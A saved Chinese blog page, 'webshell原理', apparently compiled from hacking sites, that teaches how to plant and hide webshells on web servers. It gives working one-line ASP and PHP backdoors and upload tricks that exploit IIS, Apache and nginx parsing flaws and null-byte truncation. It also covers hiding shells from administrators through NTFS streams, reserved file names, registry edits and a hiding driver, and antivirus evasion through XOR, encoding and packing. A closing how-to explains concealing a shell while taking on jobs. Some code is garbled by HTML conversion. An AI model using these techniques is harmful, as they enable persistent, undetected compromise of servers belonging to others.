+    <div class="style-mode"><a class="style-mode-btn"><i class="iconfont ic-navigation-mode"></i></a> <div class="popover-modal" style="left: 0px; display: none;"><div class="meta"><i class="iconfont ic-navigation-night"></i><span>夜间模式</span></div> <div class="switch day-night-group"><a class="switch-btn">开</a> <a class="switch-btn active">关</a></div> <hr> <div class="switch font-family-group"><a class="switch-btn font-song">宋体</a> <a class="switch-btn font-hei active">黑体</a></div> <div class="switch"><a class="switch-btn active">简</a> <a class="switch-btn">繁</a></div></div></div>
+    <div class="container">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#menu" aria-expanded="false">
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <div class="collapse navbar-collapse" id="menu">
+        <ul class="nav navbar-nav">
+            <li class="tab ">
+              <a href="https://www.jianshu.com/">
+                <span class="menu-text">首页</span><i class="iconfont ic-navigation-discover menu-icon"></i>
+</a>            </li>
+            <li class="tab ">
+              <a id="web-nav-app-download-btn" class="app-download-btn" href="https://www.jianshu.com/apps?utm_medium=desktop&amp;utm_source=navbar-apps"><span class="menu-text">下载App</span><i class="iconfont ic-navigation-download menu-icon"></i></a>
+            </li>
+          <li class="search">
+            <form target="_blank" action="https://www.jianshu.com/search" accept-charset="UTF-8" method="get"><input name="utf8" type="hidden" value="✓">
+              <input type="text" name="q" id="q" value="" autocomplete="off" placeholder="搜索" class="search-input">
+              <a class="search-btn" href="javascript:void(null)"><i class="iconfont ic-search"></i></a>
+</form>          </li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</nav>
+
+    
+<div class="note">
+  <div id="note-fixed-ad-container">
+    <div id="fixed-ad-container">
+      <div style="display: block;"></div>
+      <!---->
+      <a href="http://e.cn.miaozhen.com/r/k=2110413&amp;p=7L9Gn&amp;dx=__IPDX__&amp;rt=2&amp;ns=__IP__&amp;ni=__IESID__&amp;v=__LOC__&amp;xa=__ADPLATFORM__&amp;tr=__REQUESTID__&amp;mo=__OS__&amp;m0=__OPENUDID__&amp;m0a=__DUID__&amp;m1=__ANDROIDID1__&amp;m1a=__ANDROIDID__&amp;m2=__IMEI__&amp;m4=__AAID__&amp;m5=__IDFA__&amp;m6=__MAC1__&amp;m6a=__MAC__&amp;vo=3f2e070eb&amp;vr=2&amp;o=https%3A%2F%2Fwww.jianshu.com%2Fp%2Fee05f7eff678" target="_blank" class="yuxi-fixed-ad" style="display: none;"><div class="img"></div> <span class="ad-badge">广告</span></a>
+      <div id="_so_pdsBy_0"></div>
+    </div>
+  </div>
+  <div class="post">
+    <div class="article">
+        <h1 class="title">webshell原理</h1>
+
+        <!-- 作者区域 -->
+        <div class="author">
+          <a class="avatar" href="https://www.jianshu.com/u/b91eabbc6024">
+            <img src="./webshell原理_files/ca1f908386ab.jpeg" alt="96">
+</a>          <div class="info">
+            <span class="name"><a href="https://www.jianshu.com/u/b91eabbc6024">JackyTsuuuy</a></span>
+            <!-- 关注用户按钮 -->
+            <a class="btn btn-success follow"><i class="iconfont ic-follow"></i><span>关注</span></a>
+            <!-- 文章数据信息 -->
+            <div class="meta">
+              <!-- 简书钻 -->
+              <!-- 如果文章更新时间大于发布时间，那么使用 tooltip 显示更新时间 -->
+                <span class="publish-time" data-toggle="tooltip" data-placement="bottom" title="" data-original-title="最后编辑于 2017.12.03 07:46">2016.07.06 13:09*</span>
+              <span class="wordage">字数 8852</span>
+            <span class="views-count">阅读 7288</span><span class="comments-count">评论 2</span><span class="likes-count">喜欢 10</span></div>
+          </div>
+          <!-- 如果是当前作者，加入编辑按钮 -->
+        </div>
+
+
+        <!-- 文章内容 -->
+        <div data-note-content="" class="show-content">
+          <div class="show-content-free">
+            <p>（源自摘抄整理）<br>
+<a href="https://link.jianshu.com/?t=https://www.91ri.org/11494.html" target="_blank" rel="nofollow">https://www.91ri.org/11494.html</a></p>
+<h1>Webshell实现与隐藏探究</h1>
+<h2>一、什么是webshell</h2>
+<p>webshell简介</p>
+<p>webshell，顾名思义：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序，webshell就是就是web的一个管理工具，可以对web服务器进行操作的权限，也叫webadmin。webshell一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。<br>
+webshell的分类</p>
+<p>webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，也有基于.NET的脚本木马和JSP脚本木马。在国外，还有用python脚本语言写的动态网页，当然也有与之相关的webshell。<br>
+根据功能也分为大马与小马，小马通常指的一句话木马，例如：&lt;%eval request(“pass”)%&gt;通常把这句话写入一个文档里面，然后文件名改成xx.asp。然后传到服务器上面。这里eval方法将request(“pass”)转换成代码执行，request函数的作用是应用外部文件。这相当于一句话木马的客户端配置。服务器配置（即本机配置）：</p>
+<p>&lt;form action=http://主机路径/TEXT.asp method=post&gt;<br>
+&lt;textarea name=value cols=120 rows=10 width=45&gt;<br>
+set lP=server.createObject("Adodb.Stream")//建立流对象<br>
+lP.Open //打开<br>
+lP.Type=2 //以文本方式<br>
+lP.CharSet="gb2312" //字体标准<br>
+lP.writetext request("newvalue")<br>
+lP.SaveToFile server.mappath("newmm.asp"),2 //将木马内容以覆盖文件的方式写入newmm.asp，2就是已覆 盖的方式<br>
+lP.Close //关闭对象<br>
+set lP=nothing //释放对象<br>
+response.redirect "newmm.asp" //转向newmm.asp<br>
+&lt;/textarea&gt;<br>
+&lt;textarea name=newvalue cols=120 rows=10 width=45&gt;（添入生成木马的内容）<br>
+&lt;/textarea&gt;<br>
+&lt;BR&gt;<br>
+&lt;center&gt;<br>
+<br><br>
+&lt;input type=submit value=提交&gt;</p>
+<p>这里通过提交表单的方式，将木马提交上去，具体的做法是将定义一个对象IP，然后以文本方式写入newvalue里面的内容（newvalue的内容在textarea定义），写入以覆盖的方式产生ASP文件，然后执行这个脚本。其中客户端中的value代表的是表单的名字，必须跟服务端（本机）的post提交中的表单名一样，所以这里的value可以为任意字符，相当于一个密码之类的东西，但是这个‘密码’是明文的，可以截取下来。PHP的一句话原理跟以上的原理差不多，就是语言的差别导致语法不同。这就是小马的基本工作原理。<br>
+大马的工作模式简单的多，他没有客户端与服务端的区别，就是一些脚本大牛直接把一句话木马的服务端整合到了一起，通过上传漏洞将大马上传，然后复制该大马的url地址直接访问，在页面上执行对web服务器的渗透工作。但是有些网站对上传文件做了严格的限制，因为大马的功能较多，所以体积相对较大，很有可能超出了网站上传限制，但是小马的体积可以控制（比如把代码复制很多遍，或者在一个乱码文件中夹入代码），但是小马操作起来比较繁琐，可以先上传小马拿到webshell，然后通过小马的连接上传大马拿到服务器。</p>
+<h3>二、如何上传webshell</h3>
+<p>1.解析漏洞上传<br>
+现在对于不同的web服务器系统对应的有不同的web服务端程序，windows端主流的有iis，linux端主流的有nginx。这些服务对搭建web服务器提供了很大的帮助，同样也对服务器带来隐患，这些服务器上都存在一些漏洞，很容易被黑客利用。<br>
+(1)iis目录解析漏洞<br>
+比如：/xx.asp/xx.jpg</p>
+<p>虽然上传的是JPG文件，但是如果该文件在xx.asp文件夹下，那个iis会把这个图片文件当成xx.asp解析，这个漏洞存在于iis5.x/6.0版本。<br>
+(2)文件解析漏洞<br>
+比如：xx.asp;.jpg。在网页上传的时候识别的是jpg文件，但是上传之后iis不会解析;之后的字符，同样会把该文件解析成asp文件，这个漏洞存在于iis5.x/6.0版本。<br>
+(3)文件名解析<br>
+比如：xx.cer/xx.cdx/xx.asa。在iis6.0下，cer文件，cdx文件，asa文件都会被当成可执行文件，里面的asp代码也同样会执行。（其中asa文件是asp特有的配置文件，cer为证书文件）。<br>
+(4)fast-CGI解析漏洞<br>
+在web服务器开启fast-CGI的时候，上传图片xx.jpg。内容为：</p>
+<p>&lt;?php fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[shell])?&gt;');?&gt;</p>
+<p>这里使用的fput创建一个shell.php文件，并写入一句话。访问路径xx.jpg/.php，就会在该路径下生成一个一句话木马shell.php。这个漏洞在IIS 7.0/7.5，Nginx 8.03以下版本存在。语言环境：PHP，prel，Bourne Shell，C等语言。</p>
+<p>*注：fast-CGI是CGI的升级版，CGI指的是在服务器上提供人机交互的接口，fast-CGI是一种常驻型的CGI。因为CGI每次执行时候，都需要用fork启用一个进程，但是fast-CGI属于激活后就一直执行，不需要每次请求都fork一个进程。比普通的CGI占的内存少。<br>
+(5)apache解析漏洞<br>
+apache解析的方式是从右向左解析，如果不能解析成功，就会想左移动一个，但是后台上传通常是看上传文件的最右的一个后缀，所以根据这个，可以将马命名为xx.php.rar，因为apache解析不了rar，所以将其解析为php，但是后台上传点就将其解析为rar，这样就绕过了上传文件后缀限制<br>
+2.截断上传<br>
+在上传图片的时候，比如命名1.asp .jpg(asp后面有个空格)，在上传的时候，用NC或者<a href="https://link.jianshu.com/?t=http://www.91ri.org/4522.html" target="_blank" rel="nofollow">burpsuite</a>抓到表单，将上传名asp后面加上%00（在burpsuite里面可以直接编辑HEX值，空格的HEX值为20，将20改为00），如果HEX为00的时候表示截断，20表示空格，如果表示截断的时候就为无视脚本中的JPG验证语句，直接上传ASP。<br>
+3.后台数据库备份<br>
+在一些企业的后台管理系统中，里面有一项功能是备份数据库（比如南方cms里面就有备份数据库的功能）。可以上传一张图片，图片里面含有一句话木马，或者将大马改成jpg格式，然后用数据库备份功能，将这张图片备份为asp等其他内容可以被解析为脚本语句的格式，然后再通过web访问就可以执行木马了，但是这种方法很老了，现在大多数的cms已经把这种备份的功能取消了，或者禁用了。<br>
+4.利用数据库语句上传<br>
+(1) mysql数据库into outfile<br>
+这种方式的前提必须是该网站有相应的注入点，而且当前用户必须要有上传的权限，而且必须有当前网页在服务器下的绝对路径。方法是用联合查询，将一句话木马导入到网站下边的一个php文件中去，然后使用服务端连接该网站。但是上述方法条件过于苛刻，一般遇到的情况很少。<br>
+(2)建立新表写入木马<br>
+一些开源cms或者自制的webshell会有数据库管理功能，在数据库管理功能里面有sql查询功能，先使用create table shell(codetext);创建一个名字叫做shell的表，表里面有列明叫做code，类型为text。然后使用insert into shell(code) values(‘一句话马’)，这里讲shell表中的code列赋值为一句话的马，然后通过自定义备份，将该表备份为x.php;x然后就被解析成为php然后执行了，这里不是x.php;x就一定能够解析为php，不同的web服务器上面的服务程序不同，然后过滤规则也不同，可能会使用其他的方式。<br>
+(3)phpMyadmin设置错误<br>
+phpMyadmin用来管理网站数据库的一个工具，其中config.inc.php为其配置文件，在查看的该文件的时候，如果$cfg[‘Servers’][$i][‘auth_type’]参数的值设置没有设置（默认为config）说明在登陆数据库的时候没有做相应的验证，可以直接连入数据库，而且在Mysql在一些版本下面默认登陆都是以root用户进行登陆（即管理员），所以登陆进去为最大权限。但是root一般只能本地登陆，所以必须创建一个远程登陆用户。用远程登陆用户登陆之后，创建一个表，然后再将一句话木马写入。</p>
+<h3>三、webshell的“安全”</h3>
+<p>1.关于webshell的隐藏<br>
+在上传webshell的时候必须要进行webshell的隐藏工作。隐藏webshell，第一个目的是不让网站管理员发现马将其删掉，第二个目的是为了不被其他的Hacker发现了这个文件并加以利用。<br>
+（1）大马的隐藏<br>
+①不死僵尸<br>
+windows系统存在系统保留文件夹名，windows不允许用这些名字来命名文件夹保留文件夹：aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt。但是这些可以使用windows的copy命令创建，比如：</p>
+<p>c:&gt;copy 3.asp \.\C:\aux.asp</p>
+<p>file:///C:\Users\SAKAIY~1\AppData\Local\Temp\msohtmlclip11\clip_image020.png</p>
+<p>file:///C:\Users\SAKAIY~1\AppData\Local\Temp\msohtmlclip11\clip_image022.jpg</p>
+<p>在c盘中创建一个aux.asp。这个文件无法在图像界面下删除。<br>
+file:///C:\Users\SAKAIY~1\AppData\Local\Temp\msohtmlclip11\clip_image023.png</p>
+<p>要删除必须使用del命令。<br>
+file:///C:\Users\SAKAIY~1\AppData\Local\Temp\msohtmlclip11\clip_image024.png</p>
+<p>删除了之后是没有提示的，但是文件确实没有了。<br>
+当然用这样的方法虽然可以创建一个图形界面无法删除的webshell，但是如果直接放在网页根目录下，被有经验的网管看到还是回删除的。<br>
+②clsid隐藏<br>
+windows每一个程序都有一个clsid，如果将一个文件夹命名为x.{程序clsid}，然后输入一下两条命令：<br>
+file:///C:\Users\SAKAIY~1\AppData\Local\Temp\msohtmlclip11\clip_image026.jpg</p>
+<p>创建后<br>
+file:///C:\Users\SAKAIY~1\AppData\Local\Temp\msohtmlclip11\clip_image027.png</p>
+<p>点开进入的是控制面板，但是其实该文件还是文件夹，里面还存在大马，而且创建一个这样一个带有clsid的文件夹将其命名为相应的程序可以迷惑网络管理员的实现，比如进入回收站文件夹中创建这样一个带有回收站clsid的文件夹，在里面里面再copy一个保留字asp，还可以使用</p>
+<p>attrib +h +s +r +d/s /d</p>
+<p>修改该文件的属性，将其隐藏，一般windows都是默认不显示隐藏文件的，而且回收站文件夹是自动创建的，这样可以达到隐藏一个不死webshell到服务器中去。</p>
+<p>③驱动隐藏技术<br>
+原理是在于，在windows文件系统中，打开文件夹的时候系统会发送一个IRP_MJ_DIRECTORY_CONTROL函数，这个函数可以分配一个缓冲区，将该文件夹下的子文件夹遍历处理得到的信息存放至缓冲区，在遍历的时候，寻找匹配的文件名，如果文件名匹配，就绕过当前文件夹或者文件，对于绕过的原理，我查询了下代码，根据我的理解，它是根据将遍历的指针在查询到目标文件的时候，加上该文件的偏移量，不扫描目标文件夹，直接跳过。<br>
+对于这种技术的实施，虽然网上很多C的源码，但是操作起来有一定的困难，因为头文件的支持，还有系统的支持（不同系统的文件系统会不同），在网上查找到了Easy File Locker程序，需要将其安装至web服务器上，对目标文件设置权限。</p>
+<p>file:///C:\Users\SAKAIY~1\AppData\Local\Temp\msohtmlclip11\clip_image028.png</p>
+<p>权限的设置有可读accessable，可写writable，可删deletable，可见visible。</p>
+<p>file:///C:\Users\SAKAIY~1\AppData\Local\Temp\msohtmlclip11\clip_image030.jpg</p>
+<p>上图可以看到我们将其隐藏了，如前文所说，因为直接绕过了遍历，那么访问绝对路径却可以访问。我的理解是：</p>
+<p>c:\WINDOWS\xlkfs.dat<br>
+c:\WINDOWS\xlkfs.dll<br>
+c:\WINDOWS\xlkfs.ini<br>
+c:\WINDOWS\system32\drivers\xlkfs.sys</p>
+<p>这4个文件代替了遍历查询，要访问隐藏后的文件，输入绝对路径并不是应用绝对路径查询，而是通过上面4个文件进行的查询，相当于给隐藏文件做了一个单独的驱动。</p>
+<p>为了不被管理员发现，可以将Easy FileLocker的程序删除，但是不能删除上述4个文件。删除程序后，输入绝对路径还是可以访问，就达到了隐藏后门的作用<br>
+④注册表隐藏<br>
+注册表路径：<br>
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\explorer＼Advanced\Folder\Hidden\SHOWALL<br>
+在这个路径下有一个CheckedValue的键值，把他修改为0，如果没有CheckValue这个key直接创建一个，将他赋值为0，然后创建的隐藏文件就彻底隐藏了，即时在文件夹选项下把“显示所有文件”也不能显示了。<br>
+（2）一句话木马的隐藏<br>
+①头文件包含隐藏<br>
+在web里面的一些脚本文件中，有些文件里面有包含语句，可以利用这种包含方法包含一句话文件，在访问这个页面会直接调用这些一句话。<br>
+asp包含语句：&lt;!–#includefile=”文件路径”–&gt;，直接填入路径，文件路径是web服务器上的路径。<br>
+可以使用站长住手将一句话的NTFS流小马写入图片里面，将路径的‘\’改‘:’写入之后图片是显示不了的，然后找到web服务器上的一个asp文件，在文件的开始部分写上include语句，<br>
+&lt;!–#includefile=”inc:1.jpg”–&gt;。文件包含可以解析NTFS流为asp，包含之后，我们访问那个asp文件就包含了一句话，这样就隐藏了一句话。<br>
+php包含语句：</p>
+<p>&lt;?php include($include);?&gt;</p>
+<p>这里的$include可以是外部路径比如：</p>
+<p><a href="https://link.jianshu.com/?t=http://www.aaa.com/1.php?Include=http://www.bbb.com/hehe.php" target="_blank" rel="nofollow">http://www.aaa.com/1.php?Include=http://www.bbb.com/hehe.php</a><br>
+这个aaa上的1.php内容为</p>
+<p>&lt;?php include($include);?&gt;</p>
+<p>，表示包含。bbb是外部服务器的，前提是这个服务器不能支持PHP。否则将会在bbb这个服务器上执行hehe.php（即一句话马），而aaa不执行。</p>
+<p>②配置文件隐藏一句话（PHP）<br>
+在拿到PHP的webshell之后，可以利用php.ini隐藏文件，编辑配置文件，其中一个项功能是将某一个文件的内容添加到任意界面的页眉页脚：<br>
+auto_prepend_file =hehe.php</p>
+<p>然后看<br>
+include_path = “E:\PHPnow-1.5.6\htdocs;”</p>
+<p>这个配置信息表示加载页眉页脚的文集位置，path规则是”\path1;\path2″，表示将path1路径的文件夹下的页眉页脚文件添加到path中的文件中去，因为这里是一个‘.’表示根路径，这里就相当于添加到了主页上面去了，然后hehe.asp文件里面写上一句话，就可以通过php添加页眉的共能，将一句话写入网站首页。<br>
+③404小马<br>
+404小马在访问的时候显示出来一个404页面不存在的页面，但是实际上木马代码已经执行，一般都是按5次shift可以将它调用出来。<br>
+四、关于webshell的免杀一句话免杀<br>
+1.构造法绕过检测（PHP）<br>
+一般的检测程序会过滤这样”_POST”,”system”,”call_user_func_array”这样的字符，这个时候可以用构造法绕过一些检测程序，基本原理是，php每一个字符都都对应了一个二进制的值，可以采用异或的方式，让马中的一个字符用两个字符异或后的值来代替。<br>
+比如像一下代码</p>
+<p>&lt;?php<br>
+@$<em>++;                             // 这里++让’</em>’自加1<br>
+$<strong>=("#"^"|");                 // _<br>
+$</strong>=("."^"~");                          // P<br>
+$<strong>=("/"^"`");                  // O<br>
+$</strong>=("|"^"/");                 // S<br>
+$__=("{"^"/");                          // T<br>
+?&gt;</p>
+<p>然后构造与一句话可以写为</p>
+<p>&lt;?php @$<em>++;<br>
+$</em><em>=("#"<sup>"|").("."</sup>"~").("/"<sup>"`").("|"</sup>"/").("{"^"/");         // $</em><em>的值为<em>POST<br>
+@${$</em></em>}<a href="https://link.jianshu.com/?t=%24%7B%24__%7D%5B%24_%5D" target="_blank" rel="nofollow">!$_</a>;?&gt;</p>
+<p>// 结果为<br>
+@$_POST<a href="https://link.jianshu.com/?t=%24POST%5B1%5D" target="_blank" rel="nofollow">0</a></p>
+<p>!$_表示1的相反，在语言里面1代表真，反过来就是0（假）<br>
+但是这样的绕过方法相当弱，仔细想一下，就算是两个字符的二进制值异或，但是我们要用某个字符，还是应用那个字符的值，比如</p>
+<p>$__=("#"<sup>"|").("."</sup>"~").("/"<sup>"`").("|"</sup>"/").("{"^"/")</p>
+<p>的二进制值与_POST字符的值一样的，要是检测程序会检测二进制码的值，还是会被杀掉。</p>
+<p>2.正则表达式代替法（PHP）<br>
+php中有一个函数preg_replace()函数，这个函数可以实现正则表达式的替换工作。用替换绕过检测系统还需要php脚本语言里面的一个函数特性，函数在调用的时候，如果函数里面的形参赋的值里面含有命令，就会执行这个命令。</p>
+<p>&lt;?php<br>
+function funfunc($str){}<br>
+echopreg_replace("/&lt;title&gt;(.+?)&lt;/title&gt;/ies",'funfunc("\1")', $_POST["cmd"]);<br>
+?&gt;</p>
+<p>上述代码就是替代的一个过程，首先创建一个空函数，然后使用preg_replace函数替换表单cmd中的&lt;title&gt;&lt;/title&gt;（这里是html里面表示主题）为funfunc，将post表单中的值写成<br>
+&lt;title&gt;{${phpinfo()}}&lt;/title&gt;</p>
+<p>（当然这里的phpinfo()可以换成其他的命令），通过置换，就会变成<br>
+funfunc({${phpinfo()}})</p>
+<p>由于${}可以解析{}中的内容，所以这里的phpinfo就可以顺利执行了。<br>
+3.即时生成法（PHP）<br>
+在使用头文件包含的时候，所包含头文件php很容易被扫描器扫描到，这时候可以使用file_put_content创建一个文件，里面写如php的一句话马。在访问之前先生成马，但是这个函数比较敏感，很容易被杀。<br>
+4.回避法（asp）<br>
+因为有的asp服务器为了防止一句话马，会过滤&lt;%,%&gt;，可以使用：</p>
+<p>&lt;scriptlanguage=VBScriptrunat=server&gt;execute request("cmd")&lt;/Script&gt;</p>
+<p>功能相同，就是换个形式。<br>
+回避特定脚本语言：aspx一句话</p>
+<p>&lt;script language="C#" runat="server"&gt;WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y("add6bb58e139be10");&lt;/script&gt;</p>
+<p>这里使用C#语言写一句话马。<br>
+5.拆分法（asp）<br>
+将&lt;%eval request(“x”)%&gt;拆分为&lt;%Y=request(“x”)%&gt;&lt;%eval(Y)%&gt;，虽然绕过的可能性很小，但是也是一种绕过手法，也许有的服务器，做了很多高大上的扫描方式，但是遗漏小的问题。<br>
+还有拆分法加强版：</p>
+<p>&lt;%IfRequest("MH")&lt;&gt;"" Then Execute(Request("MH"))%&gt;<br>
+&lt;%if request("MH")&lt;&gt;""thensession("MH")=request("MH"):end if:ifsession("MH")&lt;&gt;"" then executesession("MH")%&gt;</p>
+<p>以上两句使用了if一句将其分开，中心思想将敏感字符拆分，因为一般asp特征码为eval(request或者execute(request，拆分了之后检测不到特征码，就直接绕过了。<br>
+6.乱码变形（ANSI-&gt;Unicode加密）</p>
+<p>&lt;%eval request("#")%&gt;变形为“┼攠數畣整爠煥敵瑳∨∣┩愾”</p>
+<p>eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("brute"))%&gt;</p>
+<p>上面一行代码是采用了ascii加密的方法，chr(114)代表的是ascii中的编号为114个那个字符，即r。上述代码转换后的代码为</p>
+<p>&lt;%eval (eval(request("brute"))%&gt;</p>
+<p>7.大马免杀<br>
+（1）base4code编码<br>
+大马的免杀可以通过将大马的代码进行压缩，压缩之后在进行base4的加密算法，然后在大马的末尾添加</p>
+<p>@eval(gzinflate(base64_decode($code)));</p>
+<p>就可以执行脚本了。其中，$code变量是用来存放base4的code码，执行的时候先gzinflate解压，在eval执行。其实这种不能真正意义上的免杀，以为base4code和eval还是回被列入特征码行列，在过扫描器的时候同样会被杀掉。<br>
+（2）ROT13编码（php）<br>
+str_rot13是php用来编码的一个函数。可以利用它来编码脚本代码来绕过特征码的检测，比如。<br>
+file:///C:\Users\SAKAIY~1\AppData\Local\Temp\msohtmlclip11\clip_image031.png</p>
+<p>图中的strrev函数是用来反转字符，为了逃过特征码的检测，还特地将字符用’.’号隔开。<br>
+图中3个str_rot13所加密的字符依次是gzinflate，str_rot13，base64_decode，相当于三重加密，而且也回避了gzinflate，base64_decode这两个特征码。但是没有回避str_rot13。有可能有的杀软会将str_rot13也作为特征码。<br>
+ROT13成为回转13，就是讲当前字符在字母表中的位置值减去13对应的字符加密。加密两次就回到原来的值了。但是由于算法固定，加密的强度也不强。而且破解的方式极为简单，只要再加密一边就可以了。<br>
+（3）其他编码<br>
+一般杀软和扫描器都会用特征码来判断是否有病毒，在对大马或者小马，一句话马做免杀处理的时候，一般都会用php或者asp脚本中加密类的函数来加密绕过扫描器（比如base4，rot13等），但是我觉得可以自己编写加密算法，然后使用自己编写的加密算法加密脚本代码就可以绕过一些特征码的。可以使用一些凯撒密码，移位加密等加密手段的思想，写一段加密算法，然后将脚本代码进行加密，然后base4，rot3这样的特征码就会消失，或者可以不那么麻烦，直接用自制的加密算法加密特征码，然后再使用的时候将其解密就行了。<br>
+还可以使用DES，RSA这样的密钥加密算法也可以，一般的大马都会有一个密码的登陆框，可以讲登陆脚本的密码跟解密密钥联动起来，输入正确的密码后才能够解析，一方面是为了逃过扫描器与杀软的查杀，另一方便，这个大马即使被别人拿到了，也无法解密，看到其中的源码。<br>
+五、关于webshell的后门<br>
+一般网上下载的大马或多或少的都会有后门，这些后门直接导致了我们拿的网站被别人顺带拿走了，所以在网上下载的大马必须先检查有没有后门。<br>
+比如这里的万能密码：</p>
+<p>end function<br>
+if session("hehe")&lt;&gt;userpassthen<br>
+ifrequest.form("pass")&lt;&gt;"" then<br>
+if request.form("pass")=userpassor request.form("pass")="1111111" Then<br>
+session("hehe")=userpasss<br>
+response.redirect url<br>
+else</p>
+<p>这里</p>
+<p>request.form("pass")=userpass</p>
+<p>原本是为了将pass的值进行验证，如果输入的pass值等于userpass的情况，就代表验证成功，但是后面</p>
+<p>orrequest.from(“pass”)=”1111111”</p>
+<p>表示如果输入的pass值为1111111，也可以登录大马。当然，这个地方不可能会这么简单，原作者完全可以把userpass赋值成为两个，添加一个userpass改变的触发条件，在他登录的时候触发这个条件（比如说如果登录失败的时候将触发userpass值的更新），这样就可以添加一个后面，而且触发条件的代码与验证代码分隔的较远，也不好查找，这个时候就需要我们把大马的代码逐行分析。</p>
+<p>然后再用框架挂马：</p>
+<p>&lt;iframe src=后门地址 width=0 height=0&gt;&lt;/iframe&gt;</p>
+<p>这个地方将链接的地址宽度和高度全设置为0，就该页面就隐藏了。里面的“后门地址”指向自己的脚本收信器，最后将收信脚本放到自己搭建的一个公网服务器上面，收信脚本如下：</p>
+<p>&lt;%url=Request.ServerVariables("HTTP_Referer")<br>
+　　set fs=server.CreateObject("Scripting.FileSystemObject")<br>
+　　set file=fs.OpenTextFile(server.MapPath("hehe.txt"),8,True)<br>
+　　file.writeline url<br>
+　　file.close<br>
+　　set file=nothing<br>
+　　set fs=nothing<br>
+%&gt;</p>
+<p>其中</p>
+<p>url=Request.ServerVariables("HTTP_Referer")</p>
+<p>表示请求的字符转内容，即大马的url地址，然后把url地址保存到当前目录的hehe.txt。</p>
+<p>要提出这种后门首先必须先要破坏大马第二种密码验证，即万能密码。删除相关的功能代码，然后再查找有没有asp大马页面有没有例如width=0 height=0这样的隐藏url，查找出来将其删除。</p>
+<h2>接单之隐藏一句话木马</h2>
+<p>一般 我们拿到的shell很容易被发现 或者被删除现在教你们 如何隐藏这是利用NTFS流隐藏你的一句话小马，这方法，文件写入后，不容易给发现，隐藏性好！ 如下是ASP脚本的例子！NTFS流文件的内容如下 (NTFS流文件 是什么自己百度科普 还有这个只适用于win系统服务器)<br>
+&lt;%<br>
+re= request("test")<br>
+if re &lt;&gt;"" then<br>
+execute re<br>
+response.end ‘表示结束，不再处理别的代码<br>
+end if<br>
+%&gt;<br>
+把内容写入如下位置(示例位置)H:\Web\动易\Inc:1.jpg<br>
+</p><div class="image-package">
+<div class="image-container" style="max-width: 488px; max-height: 237px; background-color: transparent;">
+<div class="image-container-fill" style="padding-bottom: 48.57%;"></div>
+<div class="image-view" data-width="488" data-height="237"><img data-original-src="//upload-images.jianshu.io/upload_images/1800415-6d42e76a21188c0c.png" data-original-width="488" data-original-height="237" data-original-format="image/png" data-original-filesize="70708" class="" style="cursor: zoom-in;" src="./webshell原理_files/1800415-6d42e76a21188c0c.png"></div>
+</div>
+<div class="image-caption">Paste_Image.png</div>
+</div><p></p>
+<p>看清楚，是 :1.jpg 不是 \1.jpg文件写入后，H:\Web\动易\Inc 目录里是看不到文件的！<br>
+现在要引导这个一句话文件！格式:<code>&lt;!-#include file="目录:1.jpg"-&gt;</code>  <br>
+我随便选一个文件(最好不要自己新建文件，别人容易发现有新文件)H:\Web\动易\Announce.asp</p>
+<p></p><div class="image-package">
+<div class="image-container" style="max-width: 618px; max-height: 261px; background-color: transparent;">
+<div class="image-container-fill" style="padding-bottom: 42.230000000000004%;"></div>
+<div class="image-view" data-width="618" data-height="261"><img data-original-src="//upload-images.jianshu.io/upload_images/1800415-05e8b6707eaa2ca0.png" data-original-width="618" data-original-height="261" data-original-format="image/png" data-original-filesize="105726" class="" style="cursor: zoom-in;" src="./webshell原理_files/1800415-05e8b6707eaa2ca0.png"></div>
+</div>
+<div class="image-caption">Paste_Image.png</div>
+</div><br>
+添加 <code>&lt;!-#include file="inc:1.jpg"-&gt;</code><br>
+修改后保存！<br>
+一句话木马隐藏基本完成！当然 H:\Web\动易\Announce.asp 你可以改个一下修改的时间，这样别人就不容易发现有问题！<br>
+还有说一下，2003的流，是可以写入文件也可以写入目录的！你想把一句话马写在目录里也成，文件里也成但建议保存到目录里，因为文件如果修改，流数据将会清空，但目录不会！用菜刀测试成功！<p></p>
+<div class="image-package">
+<div class="image-container" style="max-width: 492px; max-height: 287px; background-color: transparent;">
+<div class="image-container-fill" style="padding-bottom: 58.330000000000005%;"></div>
+<div class="image-view" data-width="492" data-height="287"><img data-original-src="//upload-images.jianshu.io/upload_images/1800415-7a58cb28c9404141.png" data-original-width="492" data-original-height="287" data-original-format="image/png" data-original-filesize="65381" class="" style="cursor: zoom-in;" src="./webshell原理_files/1800415-7a58cb28c9404141.png"></div>
+</div>
+<div class="image-caption">Paste_Image.png</div>
+</div>
+<p></p><div class="image-package">
+<div class="image-container" style="max-width: 492px; max-height: 287px; background-color: transparent;">
+<div class="image-container-fill" style="padding-bottom: 58.330000000000005%;"></div>
+<div class="image-view" data-width="492" data-height="287"><img data-original-src="//upload-images.jianshu.io/upload_images/1800415-aa0e225baf6b68f6.png" data-original-width="492" data-original-height="287" data-original-format="image/png" data-original-filesize="65381" class="" style="cursor: zoom-in;" src="./webshell原理_files/1800415-aa0e225baf6b68f6.png"></div>
+</div>
+<div class="image-caption">Paste_Image.png</div>
+</div><br>
+Hacker By T.H.E本文来源：<a href="https://link.jianshu.com/?t=http://www.t00ts.net/post-35.html" target="_blank" rel="nofollow">http://www.t00ts.net/post-35.html</a><p></p>
+<p><a href="https://link.jianshu.com/?t=http://www.jb51.net/hack/5833.html" target="_blank" rel="nofollow">http://www.jb51.net/hack/5833.html</a></p>
